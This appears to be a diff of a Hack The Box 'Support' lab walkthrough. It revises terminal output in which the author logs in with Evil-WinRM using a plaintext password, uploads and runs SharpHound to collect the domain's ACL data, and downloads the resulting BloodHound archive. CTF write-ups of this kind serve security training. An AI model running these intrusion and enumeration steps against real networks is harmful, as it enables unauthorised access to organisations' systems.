@@ -1009,45 +1009,6 @@ cd C:\Users\support\Documents
 **Result:**
 
 ```shell
-*Evil-WinRM* PS C:\Users\support\Documents> cmd /c "dir C:\Users\support\Documents\*.zip"
- Volume in drive C has no label.
- Volume Serial Number is 955A-5CBB
-
- Directory of C:\Users\support\Documents
-
-07/22/2026  04:08 AM            12,353 20260722040820_BloodHound.zip
-               1 File(s)         12,353 bytes
-               0 Dir(s)   3,962,662,912 bytes free
-*Evil-WinRM* PS C:\Users\support\Documents> download 20260722040820_BloodHound.zip
-
-Info: Downloading C:\Users\support\Documents\20260722040820_BloodHound.zip to 20260722040820_BloodHound.zip
-
-Info: Download successful!
-*Evil-WinRM* PS C:\Users\support\Documents> 
-
-Error: An error of type NoMethodError happened, message is undefined method `empty?' for nil
-
-Error: Exiting with code 1
-
-┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
-└─$ ls
-20260722040820_BloodHound.zip                              Microsoft.Extensions.Logging.Abstractions.dll  System.Threading.Tasks.Extensions.dll
-CommandLineParser.dll                                      SharpHound.exe                                 UserInfo_decompiled.cs
-decrypt.py                                                 System.Buffers.dll                             UserInfo.exe
-Microsoft.Bcl.AsyncInterfaces.dll                          System.Memory.dll                              UserInfo.exe.config
-Microsoft.Extensions.DependencyInjection.Abstractions.dll  System.Numerics.Vectors.dll                    UserInfo.exe.zip
-Microsoft.Extensions.DependencyInjection.dll               System.Runtime.CompilerServices.Unsafe.dll
-
-┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
-└─$ evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
-
-Evil-WinRM shell v3.9
-
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\support\Documents> cd C:\Windows\Temp
 *Evil-WinRM* PS C:\Windows\Temp> upload SharpHound.exe
 
@@ -1055,46 +1016,50 @@ Info: Uploading /home/kali/nedmoeca/HTB/Machines/Retired/Support/SharpHound.exe 
 
 Info: Upload successful!
 *Evil-WinRM* PS C:\Windows\Temp> C:\Windows\Temp\SharpHound.exe -c All --outputdirectory C:\Users\support\Documents
-2026-07-22T04:24:24.6989381-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
-2026-07-22T04:24:24.8864292-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
-2026-07-22T04:24:24.9020460-07:00|INFORMATION|Initializing SharpHound at 4:24 AM on 7/22/2026
-2026-07-22T04:24:25.4178743-07:00|INFORMATION|Loaded cache with stats: 67 ID to type mappings.
+2026-07-22T04:45:47.7301735-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
+2026-07-22T04:45:47.9176907-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2026-07-22T04:45:47.9332973-07:00|INFORMATION|Initializing SharpHound at 4:45 AM on 7/22/2026
+2026-07-22T04:45:48.4020744-07:00|INFORMATION|Loaded cache with stats: 67 ID to type mappings.
  67 name to SID mappings.
  0 machine sid mappings.
  2 sid to domain mappings.
  0 global catalog mappings.
-2026-07-22T04:24:25.4334377-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
-2026-07-22T04:24:25.6364416-07:00|INFORMATION|Beginning LDAP search for support.htb
-2026-07-22T04:24:25.6834809-07:00|INFORMATION|Producer has finished, closing LDAP channel
-2026-07-22T04:24:25.6989256-07:00|INFORMATION|LDAP channel closed, waiting for consumers
-2026-07-22T04:24:56.4646865-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 39 MB RAM
-2026-07-22T04:25:10.7926782-07:00|INFORMATION|Consumers finished, closing output channel
-2026-07-22T04:25:10.8239270-07:00|INFORMATION|Output channel closed, waiting for output task to complete
+2026-07-22T04:45:48.4176746-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2026-07-22T04:45:48.5895594-07:00|INFORMATION|Beginning LDAP search for support.htb
+2026-07-22T04:45:48.6364249-07:00|INFORMATION|Producer has finished, closing LDAP channel
+2026-07-22T04:45:48.6364249-07:00|INFORMATION|LDAP channel closed, waiting for consumers
+2026-07-22T04:46:19.4802056-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 39 MB RAM
+2026-07-22T04:46:37.8083336-07:00|INFORMATION|Consumers finished, closing output channel
 Closing writers
-2026-07-22T04:25:10.9176720-07:00|INFORMATION|Status: 108 objects finished (+108 2.4)/s -- Using 44 MB RAM
-2026-07-22T04:25:10.9176720-07:00|INFORMATION|Enumeration finished in 00:00:45.2977935
-2026-07-22T04:25:10.9958077-07:00|INFORMATION|Saving cache with stats: 67 ID to type mappings.
+2026-07-22T04:46:37.8551726-07:00|INFORMATION|Output channel closed, waiting for output task to complete
+2026-07-22T04:46:37.9489208-07:00|INFORMATION|Status: 108 objects finished (+108 2.204082)/s -- Using 44 MB RAM
+2026-07-22T04:46:37.9489208-07:00|INFORMATION|Enumeration finished in 00:00:49.3640602
+2026-07-22T04:46:38.0270481-07:00|INFORMATION|Saving cache with stats: 67 ID to type mappings.
  67 name to SID mappings.
  0 machine sid mappings.
  2 sid to domain mappings.
  0 global catalog mappings.
-2026-07-22T04:25:11.0114337-07:00|INFORMATION|SharpHound Enumeration Completed at 4:25 AM on 7/22/2026! Happy Graphing!
-*Evil-WinRM* PS C:\Windows\Temp> cmd /c "dir C:\Users\support\Documents\*.zip"
- Volume in drive C has no label.
- Volume Serial Number is 955A-5CBB
+2026-07-22T04:46:38.0426726-07:00|INFORMATION|SharpHound Enumeration Completed at 4:46 AM on 7/22/2026! Happy Graphing!
+*Evil-WinRM* PS C:\Windows\Temp> cd C:\Users\support\Documents
+*Evil-WinRM* PS C:\Users\support\Documents> dir
 
- Directory of C:\Users\support\Documents
 
-07/22/2026  04:08 AM            12,353 20260722040820_BloodHound.zip
-07/22/2026  04:25 AM            12,352 20260722042510_BloodHound.zip
-               2 File(s)         24,705 bytes
-               0 Dir(s)   3,961,569,280 bytes free
-*Evil-WinRM* PS C:\Windows\Temp> download 20260722042510_BloodHound.zip
+    Directory: C:\Users\support\Documents
 
-Info: Downloading C:\Windows\Temp\20260722042510_BloodHound.zip to 20260722042510_BloodHound.zip
 
-Error: Download failed. Check filenames or paths
-*Evil-WinRM* PS C:\Windows\Temp> 
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         7/22/2026   4:46 AM          12378 20260722044637_BloodHound.zip
+-a----         7/22/2026   4:43 AM        1051648 SharpHound.exe
+-a----         7/22/2026   4:46 AM          10022 YzgyNDA2MjMtMDk1ZC00MGYxLTk3ZjUtMmYzM2MzYzVlOWFi.bin
+
+
+*Evil-WinRM* PS C:\Users\support\Documents> download 20260722044637_BloodHound.zip
+
+Info: Downloading C:\Users\support\Documents\20260722044637_BloodHound.zip to 20260722044637_BloodHound.zip
+
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\support\Documents> 
 ```
 
 _What this gives you:_ **Key finding:** SharpHound enumerated all 108 domain objects and produced `20260722040820_BloodHound.zip` containing the domain's ACL data, ready for analysis.
